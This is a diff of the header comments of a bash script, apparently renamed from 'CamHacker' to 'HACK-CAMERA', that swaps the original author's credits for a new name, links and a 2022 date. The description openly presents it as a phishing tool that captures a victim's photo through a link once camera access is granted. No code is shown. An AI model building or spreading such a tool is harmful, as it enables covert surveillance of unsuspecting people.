@@ -1,15 +1,14 @@
 #!/bin/bash
 
 # CamHacker
-# Version    : 1.3
-# Description: CamHacker is a camera Phishing tool. Send a phishing link to victim, if he/she gives access to camera, his/her photo will be captured!
-# Author     : KasRoudra
-# Github     : https://github.com/KasRoudra
-# Email      : kasroudrakrd@gmail.com
-# Credits    : Noob-Hackers, TechChipNet, LinuxChoice
-# Date       : 5-09-2021
+# Version    : 1.5
+# Description: HACK-CAMERA is a camera Phishing tool. Send a phishing link to victim, if he/she gives access to camera, his/her photo will be captured!
+# Author     : XPHANTOM (PH4N70M)
+# Github     : https://github.com/XPH4N70M
+# Join Us    : https://bit.ly/3LAy80f
+# Date       : 29-05-2022
 # License    : MIT
-# Copyright  : KasRoudra (2021-2022)
+# Copyright  : X PHANTOM X PH4N70M (2022-2023)
 # Language   : Shell
 # Portable File
 # If you copy, consider giving credit! We keep our code open source to help others
